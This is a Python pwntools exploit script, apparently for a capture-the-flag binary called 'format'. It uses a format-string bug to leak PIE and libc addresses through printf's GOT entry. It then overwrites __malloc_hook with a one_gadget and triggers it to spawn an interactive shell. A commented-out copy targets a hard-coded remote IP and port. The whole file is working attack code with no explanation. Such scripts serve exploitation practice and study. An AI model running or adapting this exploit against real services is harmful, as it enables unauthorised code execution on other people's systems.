#!/usr/bin/python3
import sys

from pwn import *
import json

elf = context.binary = ELF('format')
context.arch = 'amd64'
# context.log_level = 'debug'

def start():

    global elf

    file_name = './format'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwndbg
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process(file_name)


def run_main():

    global elf

    def send_payload2(payload):
        io.sendline(payload)
        return io.recv()

    io = start()

    # for i in range(100):
    #     io.sendline(f'%{i+1}$p')
    #     info(f'{i + 1} : {io.recvline().decode()}')

    # io.interactive()
    # sys.exit()

    io.sendline('%41$p')
    leaked_addr = int(io.recvline().strip().decode()[2:], 16)
    info(f'leaked_addr: {hex(leaked_addr)}')
    
    elf.address = leaked_addr - 4787

    info(f'piebase: {hex(elf.address)}')    
    info(f'printf_got: {hex(elf.symbols.got.printf)}')

    printf_got = p64(elf.symbols.got.printf)
    payload = b'AAAA%7$s' + printf_got

    io.sendline(payload)

    data = io.recv()
    
    leaked_address = u64(data[4:10].ljust(8, b'\x00'))

    info(f'leaked_printf: {hex(leaked_address)}')

    printf_address = leaked_address
    libc_base = leaked_address - 0x64e80

    __malloc_hook = libc_base + 0x3ebc30
    one_gadget = libc_base + 0x4f322

    io.sendline(fmtstr_payload(6, {__malloc_hook: one_gadget}))
    
    io.recv()
    io.sendline('%100000c')
    
    io.interactive()
    io.close()


if __name__ == '__main__':
    run_main()




# from pwn import *
# context.arch = "amd64"
# context.log_level = 'debug'
# elf = ELF("format")
# #libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
# # libc = ELF("libc6_2.27-3ubuntu1_amd64.so") # <-- Loading leaked libc 
# #p = process("./format")
# p = remote("139.59.166.5", 30463)
# #gdb.attach(p,'''b*__malloc_hook''')
# # ELF base address - leaking && calculating ---
# p.sendline("%37$p")
# init_leak = (p.recvline())
# log.success("LEAK => (init+117) address: " + init_leak)
# base_elf = int(init_leak,16) - 0x126d
# log.info("Base ELF address: " + hex(base_elf))
# elf.address = base_elf # updating ELF
# # ---
# # Leaking __printf address through printf() ---
# printf_got_plt = elf.got["printf"]
# log.info("printf@got.plt address: " + hex(printf_got_plt))
# p.sendline("AAAA%7$s" + p64(printf_got_plt))
# printf_leak = p.recv()
# printf_libc = u64(printf_leak[4:10].ljust(8,"\x00"))
# log.success("Leaked __printf: " + hex(printf_libc))
# # ---
# # Calculating base libc, __malloc_hook and one_gadget ---
# base_libc = printf_libc - 0x64e80
# malloc_hook_addr = base_libc + 0x3ebc30
# one_gadget = base_libc + 0x4f322
# # ---
# # Taking control of exeuction flow - overriding __malloc_hook with one_gadget ---
# p.sendline(fmtstr_payload(6, { malloc_hook_addr: one_gadget }))
# p.recv()
# p.sendline('%100000c') # __malloc_hook trigger
# p.interactive()
# p.close()
# # ---